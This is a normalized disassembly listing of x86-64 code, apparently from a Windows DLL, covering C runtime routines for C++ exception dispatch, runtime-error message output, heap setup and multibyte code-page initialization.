mov rbp [ rsp + 0x5d0 ]
mov r12 [ rsp + 0x5c8 ]
mov r13 [ rsp + 0x5b8 ]
movzx r15d [ rsp + 0x5b0 ]
jmp r-xdata
mov rbp [ rsp + 0x5d0 ]
mov r12 [ rsp + 0x5c8 ]
mov r13 [ rsp + 0x5b8 ]
lea r9 [ rsp + 0x70 ]
mov r15b 0x1
mov r8 rbp
mov rdx r12
mov rcx r13
mov [ rsp + 0x5b0 ] r15b
call sub_180006990
test rsi rsi
mov rbx rax
je r-xdata
movsxd rbx [ rdi + 0x4 ]
call sub_180006aa0
add rax rbx
je r-xdata
mov edx [ rsp + 0x54 ]
mov ecx [ rsp + 0x50 ]
mov edi [ rsp + 0x58 ]
call sub_180006aa0
movsxd rcx [ rdi + 0xc ]
mov r8 [ rsp + 0x5c0 ]
add rax rcx
movzx ecx [ rsp + 0x5d8 ]
mov r9 rbx
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0x60 ]
mov [ rsp + 0x38 ] r12
mov ecx [ rcx ]
mov [ rsp + 0x30 ] rbp
mov rdx r14
mov [ rsp + 0x28 ] ecx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_1800070b0
mov rbx [ rsp + 0x60 ]
jmp r-xdata
mov r9 rsi
mov r8 rdi
mov rdx rax
mov rcx r14
call sub_18000b950
test ebx ebx
je r-xdata
xor eax eax
movsxd rbx [ rdi + 0x4 ]
call sub_180006aa0
add rax rbx
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ rax + 0x10 ] 0x0
je r-xdata
xor ebx ebx
call sub_180006aa0
movsxd rbx [ rdi + 0x4 ]
add rbx rax
jmp r-xdata
test [ rsi ] 0x2
je r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
call sub_180006ac0
movsxd rcx [ rsi + 0x4 ]
add rax rcx
cmp rbx rax
je r-xdata
mov eax [ r12 ]
test al 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
xor ebx ebx
call sub_180006aa0
movsxd rbx [ rdi + 0x4 ]
add rbx rax
jmp r-xdata
test al 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
sub ebp 0x1
add r13 0x4
test ebp ebp
jg r-xdata
test edx edx
jne r-xdata
add rcx 0x1
test eax eax
jne r-xdata
call sub_180006ac0
movsxd rcx [ rsi + 0x4 ]
lea r8 [ rax + rcx + 0x10 ]
lea rcx [ rbx + 0x10 ]
sub r8 rcx
nop
test al 0x2
je r-xdata
test [ rdi ] 0x4
je r-xdata
call sub_180006ac0
mov r12 [ r14 + 0x30 ]
mov rsi rax
movsxd rax [ r13 ]
add rsi rax
cmp [ rdi + 0x4 ] 0x0
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + r8 ]
sub edx eax
jne r-xdata
test [ rdi ] 0x2
jne r-xdata
sub_18000c310
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_18000a690
mov rdi [ rsp + 0x70 ]
cmp [ rax + 0x2d0 ] 0x0
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
mov eax [ rbx ]
cmp eax 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
mov ecx [ rdi + 0x4 ]
test ecx ecx
je r-xdata
cmp eax 0x80000029
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov eax 0x1
cmp [ rsp + 0x78 ] 0x0
jne r-xdata
cmp eax 0x80000026
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x80 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x78 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
movzx eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_18000bc90
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov eax [ rdi ]
and eax 0x1fffffff
cmp eax 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
call sub_180006aa0
movsxd rcx [ rdi + 0x20 ]
add rax rcx
je r-xdata
test eax eax
je r-xdata
cmp [ rbx ] 0x80000026
jne r-xdata
test [ rdi + 0x24 ] 0x1
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_180006b20
jmp r-xdata
cmp [ rbx ] 0x80000029
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_180009f40
cmp eax 0xffffffff
mov ebx eax
jl r-xdata
call sub_180006ac0
mov rcx [ rbx + 0x30 ]
movsxd rdx [ rcx + 0x8 ]
add rax rdx
je r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_18000c560
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx ecx [ rsp + 0x88 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] ecx
mov rcx [ rsp + 0x80 ]
mov rdx rsi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov [ rsp + 0x28 ] ecx
mov rcx rbx
mov [ rsp + 0x20 ] rdi
call rax
jmp r-xdata
call sub_18000c560
cmp esi ecx
jl r-xdata
mov r9d ebx
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_18000ae10
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
mov r8 rdi
mov rdx rbp
call sub_18000ae10
jmp r-xdata
sub_18000c5b0
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x30
lea r12 [ rw-data ]
xor esi esi
mov edi ecx
mov rax r12
mov ebx esi
nop
cmp ebx 0x17
jae r-xdata
add ebx 0x1
add rax 0x10
cmp ebx 0x17
jb r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov ecx 0x3
call sub_1800102d0
cmp eax 0x1
je r-xdata
cmp ecx [ rax ]
je r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
test rax rax
mov r11 rax
je r-xdata
mov ecx 0x3
call sub_1800102d0
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
movsxd rcx ebx
lea r9 [ rsp + 0x58 ]
add rcx rcx
mov [ rsp + 0x20 ] rsi
mov rdx [ r12 + rcx * 8 + 0x8 ]
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx r11
call [ WriteFile@IAT ]
mov [ rsp + 0x50 ] rbp
lea rbp [ rw-data ]
lea r8 [ r--data ]
mov rcx rbp
mov edx 0x314
call sub_180007260
test eax eax
je r-xdata
lea rdx [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov [ rw-data ] sil
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008c80
or rcx 0xffffffffffffffff
xor eax eax
lea rdi [ rw-data ]
[ rdi ]
not rcx
cmp rcx 0x3c
jbe r-xdata
lea r8 [ r--data ]
lea rcx [ rw-data ]
mov edx 0x2fb
call sub_180007260
test eax eax
je r-xdata
lea r8 [ r--data ]
mov edx 0x314
mov rcx rbp
call sub_1800100f0
test eax eax
je r-xdata
lea rcx [ rcx + rbp - 0x23 ]
lea rdx [ rw-data ]
lea r9d [ rax + 0x3 ]
lea r8 [ r--data ]
sub rdx rcx
call sub_1800101b0
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008c80
movsxd r8 ebx
mov edx 0x314
mov rcx rbp
add r8 r8
mov r8 [ r12 + r8 * 8 + 0x8 ]
call sub_1800100f0
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008c80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008c80
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_18000fe90
mov rbp [ rsp + 0x50 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180008c80
sub_18000c7f0
sub rsp 0x38
mov ecx 0x3
call sub_1800102d0
cmp eax 0x1
je r-xdata
mov [ rsp + 0x48 ] rbx
lea rbx [ rw-data ]
mov [ rsp + 0x30 ] rdi
mov rax rbx
xor edi edi
mov ecx 0x3
call sub_1800102d0
test eax eax
jne r-xdata
cmp edi 0x17
jae r-xdata
add edi 0x1
add rax 0x10
cmp edi 0x17
jb r-xdata
add rsp 0x38
retn
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx 0xff
call sub_18000c5b0
mov rdi [ rsp + 0x30 ]
mov rbx [ rsp + 0x48 ]
mov ecx 0x3
call sub_1800102d0
cmp eax 0x1
je r-xdata
cmp [ rax ] 0xfc
je r-xdata
jmp r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
test rax rax
mov r11 rax
je r-xdata
mov ecx 0x3
call sub_1800102d0
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
movsxd rcx edi
xor eax eax
lea r9 [ rsp + 0x40 ]
add rcx rcx
mov [ rsp + 0x20 ] rax
mov rdx [ rbx + rcx * 8 + 0x8 ]
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx r11
call [ WriteFile@IAT ]
sub_18000c8e0
mov [ rsp + 0x8 ] ecx
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
call [ HeapCreate@IAT ]
test rax rax
mov [ rw-data ] rax
jne r-xdata
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
mov rcx rax
mov [ rsp + 0x30 ] 0x2
call [ HeapSetInformation@IAT ]
mov eax 0x1
add rsp 0x28
retn
add rsp 0x28
retn
sub_18000c980
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call sub_18000a340
test rax rax
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_18000c9c0
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_180009ab0
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_180009980
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
mov [ rsp + 0x20 ] rcx
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_1800085f0
mov [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_1800085f0
jmp r-xdata
test rcx rcx
je r-xdata
sub_18000ca60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rsi rcx
mov edi 0x101
mov rcx rbx
mov r8 rdi
xor edx edx
call sub_1800059c0
xor r11d r11d
lea r8 [ rw-data ]
mov [ rsi + 0x4 ] r11d
mov [ rsi + 0x8 ] r11d
mov [ rsi + 0xc ] r11d
mov [ rsi + 0x10 ] r11
sub r8 rsi
mov [ rsi + 0x18 ] r11d
nop
nop
movzx eax [ r8 + rbx ]
add rbx 0x1
sub rdi 0x1
mov [ rbx - 0x1 ] al
jne r-xdata
lea r9 [ rw-data ]
lea rcx [ rsi + 0x11d ]
mov edx 0x80
sub r9 rsi
nop
nop
movzx eax [ rcx + r8 ]
add rcx 0x2
sub rdx 0x1
mov [ rcx - 0x2 ] al
movzx eax [ r9 + rcx - 0x2 ]
mov [ rcx - 0x1 ] al
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000cb10
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rdi
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x570 ] rax
mov rbp rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
xor ebx ebx
lea rcx [ rbp + 0x1d ]
mov edi 0x100
nop
nop
xor ebx ebx
mov [ rsp + 0x598 ] rsi
lea rdx [ rsp + 0x70 ]
mov eax ebx
mov edi 0x100
cmp edx 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rbx + 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
mov [ rdx ] al
add eax 0x1
add rdx 0x1
cmp eax edi
jb r-xdata
movzx eax [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rsi [ rsp + 0x56 ]
test al al
je r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rbx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
add ebx 0x1
add rcx 0x1
cmp ebx edi
jb r-xdata
mov eax [ rbp + 0xc ]
mov [ rsp + 0x38 ] ebx
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rbp + 0x4 ]
mov r9d edi
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x370 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180010c30
mov eax [ rbp + 0x4 ]
mov edx [ rbp + 0xc ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x170 ]
mov [ rsp + 0x30 ] edi
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d edi
xor ecx ecx
mov [ rsp + 0x20 ] edi
call sub_180010870
mov eax [ rbp + 0x4 ]
mov edx [ rbp + 0xc ]
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x270 ]
mov [ rsp + 0x30 ] edi
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] edi
call sub_180010870
mov rsi [ rsp + 0x598 ]
lea r11 [ rsp + 0x370 ]
lea rcx [ rbp + 0x1d ]
nop
movzx edx [ rsi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
lea edx [ rbx - 0x61 ]
lea eax [ rdx + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rsp + 0x570 ]
xor rcx rsp
call sub_180006970
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
test al 0x2
je r-xdata
movzx eax [ rsp + rbx + 0x170 ]
or [ rcx ] 0x10
mov [ rcx + 0x100 ] al
jmp r-xdata
mov al [ rsi + 0x2 ]
add rsi 0x2
test al al
jne r-xdata
sub edx r8d
mov rax r8
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_1800059c0
mov [ rcx + 0x100 ] 0x0
movzx eax [ rsp + rbx + 0x270 ]
or [ rcx ] 0x20
mov [ rcx + 0x100 ] al
jmp r-xdata
add rcx 0x1
add rbx 0x1
add r11 0x2
sub rdi 0x1
jne r-xdata
movzx eax [ r11 ]
test al 0x1
je r-xdata
jmp r-xdata
sub_18000cd30
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_18000a690
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_180009ab0
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_180009980
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_180009430
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ] 0x1
mov rbx [ rsp + 0x30 ]
[ rbx ] 0xffffffff
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_1800085f0
sub_18000ce10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi ecx
xor sil sil
call sub_18000a690
mov r12 [ rax + 0xc0 ]
mov rbp [ rax + 0xb8 ]
mov rbx rax
cmp r12 [ rw-data ]
je r-xdata
cmp rbp [ rw-data ]
je r-xdata
mov edx [ rax + 0xc8 ]
test [ rw-data ] edx
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test cl 0x2
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov r12 rax
cmp edi 0xfffffffe
mov [ rw-data ] 0x0
jne r-xdata
or ecx 0x2
mov sil 0x1
mov [ rbx + 0xc8 ] ecx
call sub_18000cd30
cmp edi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp edi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
and [ rbx + 0xc8 ] 0xfffffffd
jmp r-xdata
test sil sil
je r-xdata
mov eax [ r12 + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
test sil sil
je r-xdata
mov eax edi
and [ rbx + 0xc8 ] 0xfffffffd
sub_18000cf20
push rbx
push rbp
push rsi
push rdi
sub rsp 0x48
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rbx rdx
call sub_18000ce10
test eax eax
mov edi eax
jne r-xdata
mov [ rsp + 0x80 ] r12
xor ebp ebp
mov [ rsp + 0x40 ] r13
lea r13 [ rw-data ]
mov ecx ebp
mov r12 rbp
mov rax r13
nop
lea rdi [ rbx + 0x1c ]
mov esi 0x101
xor edx edx
mov rcx rdi
mov r8 rsi
call sub_1800059c0
xor ebp ebp
lea rdx [ rw-data ]
mov [ rbx + 0x4 ] ebp
mov [ rbx + 0x8 ] ebp
mov [ rbx + 0xc ] ebp
mov [ rbx + 0x10 ] rbp
sub rdx rbx
mov [ rbx + 0x18 ] ebp
nop
lea rcx [ rbx + 0x1c ]
mov r8d 0x101
xor edx edx
call sub_1800059c0
lea r9 [ r12 + r12 * 2 ]
lea rax [ rw-data ]
shl r9 0x4
lea r11 [ rw-data ]
mov r10d 0x4
add r9 rax
nop
nop
add ecx 0x1
add r12 0x1
add rax 0x30
cmp ecx 0x5
jb r-xdata
movzx eax [ rdx + rdi ]
add rdi 0x1
sub rsi 0x1
mov [ rdi - 0x1 ] al
jne r-xdata
lea r9 [ rw-data ]
lea rcx [ rbx + 0x11d ]
mov r8d 0x80
sub r9 rbx
nop
nop
add r9 0x8
add r11 0x1
sub r10 0x1
jne r-xdata
nop
nop
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
movzx eax [ rcx + rdx ]
add rcx 0x2
sub r8 0x1
mov [ rcx - 0x2 ] al
movzx eax [ r9 + rcx - 0x2 ]
mov [ rcx - 0x1 ] al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ r9 ] bpl
mov r8 r9
je r-xdata
mov [ rbx + 0x4 ] edi
sub edi 0x3a4
mov [ rbx + 0x8 ] 0x1
je r-xdata
movzx edx [ r8 ]
movzx eax al
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_180006970
add rsp 0x48
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov ebp 0x411
sub edi 0x4
je r-xdata
add r8 0x2
cmp [ r8 ] bpl
jne r-xdata
lea rcx [ rdx + rbx + 0x1d ]
nop
nop
mov r12 [ rsp + 0x80 ]
mov r13 [ rsp + 0x40 ]
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebp 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
movzx eax [ r8 + 0x1 ]
test al al
je r-xdata
movzx eax [ r11 ]
add edx 0x1
add rcx 0x1
or [ rcx - 0x1 ] al
movzx eax [ r8 + 0x1 ]
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov [ rbx + 0xc ] ebp
lea rcx [ r12 + r12 * 2 ]
add rcx rcx
movzx eax [ r13 + rcx * 8 + 0x4 ]
mov [ rbx + 0x10 ] ax
movzx eax [ r13 + rcx * 8 + 0x6 ]
mov [ rbx + 0x12 ] ax
movzx eax [ r13 + rcx * 8 + 0x8 ]
mov [ rbx + 0x14 ] ax
movzx eax [ r13 + rcx * 8 + 0xa ]
mov [ rbx + 0x16 ] ax
movzx eax [ r13 + rcx * 8 + 0xc ]
mov [ rbx + 0x18 ] ax
movzx eax [ r13 + rcx * 8 + 0xe ]
mov [ rbx + 0x1a ] ax
mov ebp 0x412
jmp r-xdata
cmp edi 0x1
jne r-xdata
cmp [ rw-data ] ebp
je r-xdata
lea rcx [ rbx + 0x1c ]
mov r8d 0x101
xor edx edx
call sub_1800059c0
cmp [ rsp + 0x20 ] 0x1
mov [ rbx + 0x4 ] edi
mov [ rbx + 0xc ] ebp
jbe r-xdata
mov ebp 0x404
jmp r-xdata
mov rcx rbx
call sub_18000ca60
jmp r-xdata
mov [ rbx + 0x8 ] ebp
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] ebp
jmp r-xdata
cmp [ rsp + 0x26 ] bpl
lea rdx [ rsp + 0x26 ]
je r-xdata
xor eax eax
mov rcx rbx
call sub_18000cb10
lea rax [ rbx + 0x1f ]
mov ecx 0x7f
nop
nop
nop
nop
movzx eax [ rdx + 0x1 ]
test al al
je r-xdata
or [ rax - 0x1 ] 0x8
or [ rax ] 0x8
add rax 0x2
sub rcx 0x1
jne r-xdata
mov ecx [ rbx + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx r8d [ rdx ]
movzx ecx al
cmp r8d ecx
ja r-xdata
mov [ rbx + 0x8 ] 0x1
mov eax 0x411
mov [ rbx + 0xc ] eax
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] ebp
jmp r-xdata
sub ecx 0x4
je r-xdata
add rdx 0x2
cmp [ rdx ] bpl
jne r-xdata
sub ecx r8d
lea rax [ r8 + rbx + 0x1d ]
add ecx 0x1
mov [ rbx + 0x8 ] 0x1
mov eax 0x804
mov [ rbx + 0xc ] eax
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] ebp
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rax ] 0x4
add rax 0x1
sub rcx 0x1
jne r-xdata
mov [ rbx + 0x8 ] 0x1
mov eax 0x412
mov [ rbx + 0xc ] eax
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] ebp
jmp r-xdata
cmp ecx 0x1
je r-xdata
mov [ rbx + 0x8 ] 0x1
mov eax 0x404
mov [ rbx + 0xc ] eax
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] ebp
jmp r-xdata
mov [ rbx + 0x8 ] 0x1
mov eax ebp
mov [ rbx + 0xc ] eax
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] ebp
jmp r-xdata
sub_18000d2e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov edi ecx
or r14d 0xffffffff
call sub_18000a690
mov rsi rax
call sub_18000cd30
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_18000ce10
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor ebx ebx
mov r14d ebx
mov ecx 0x220
call sub_180008800
mov rdi rax
test rax rax
je r-xdata
mov eax r14d
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_18000aa30
xor ebx ebx
mov [ rdi ] ebx
mov rdx rdi
mov ecx r12d
call sub_18000cf20
mov r14d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
[ rcx ] 0xffffffff
jne r-xdata
lea r12 [ rw-data ]
cmp rdi r12
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
cmp rcx r12
je r-xdata
call sub_180008e80
mov [ rax ] 0x16
jmp r-xdata
mov rcx rdi
call sub_1800085f0
test [ rw-data ] 0x1
jne r-xdata
mov [ rsi + 0xb8 ] rdi
[ rdi ] 0x1
test [ rsi + 0xc8 ] 0x2
jne r-xdata
call sub_1800085f0
jmp r-xdata
mov ecx 0xd
call sub_180009ab0
nop
mov eax [ rdi + 0x4 ]
mov [ rw-data ] eax
mov eax [ rdi + 0x8 ]
mov [ rw-data ] eax
mov eax [ rdi + 0xc ]
mov [ rw-data ] eax
mov edx ebx
mov [ rsp + 0x20 ] ebx
lea r8 [ __dos_header ]
mov edx ebx
mov [ rsp + 0x20 ] ebx
movsxd rcx edx
movzx eax [ rdi + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x1c968 ] ax
add edx 0x1
mov [ rsp + 0x20 ] edx
jmp r-xdata
mov [ rsp + 0x20 ] ebx
nop
nop
movsxd rcx edx
movzx eax [ rcx + rdi + 0x1c ]
mov [ rcx + r8 + 0x1ad90 ] al
add edx 0x1
mov [ rsp + 0x20 ] edx
jmp r-xdata
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ] 0xffffffff
jne r-xdata
movsxd rcx ebx
movzx eax [ rcx + rdi + 0x11d ]
mov [ rcx + r8 + 0x1aea0 ] al
add ebx 0x1
mov [ rsp + 0x20 ] ebx
jmp r-xdata
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rdi
[ rdi ] 0x1
mov ecx 0xd
call sub_180009980
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
cmp ebx 0x100
jge r-xdata
call sub_1800085f0
sub_18000d540
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rdi rcx
test rax rax
je r-xdata
mov rax [ rdi + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rdi + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rdi + 0x110 ]
test rax rax
je r-xdata
lea rbx [ rdi + 0x58 ]
mov esi 0x6
lea rbp [ rw-data ]
nop
nop
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rdi + 0x138 ]
sub rcx 0xfe
call sub_1800085f0
mov rcx [ rdi + 0x148 ]
add rcx 0xffffffffffffff80
call sub_1800085f0
mov rcx [ rdi + 0x150 ]
add rcx 0xffffffffffffff80
call sub_1800085f0
mov rcx [ rdi + 0x130 ]
call sub_1800085f0
cmp [ rax ] 0x0
jne r-xdata
cmp [ rbx - 0x8 ] 0x0
je r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
call sub_180010d80
mov rcx [ rdi + 0x158 ]
call sub_1800085f0
mov rcx [ rdi + 0x120 ]
test rcx rcx
je r-xdata
add rbx 0x20
sub rsi 0x1
jne r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rdi + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
cmp [ rbx - 0x10 ] rbp
je r-xdata
mov rcx rdi
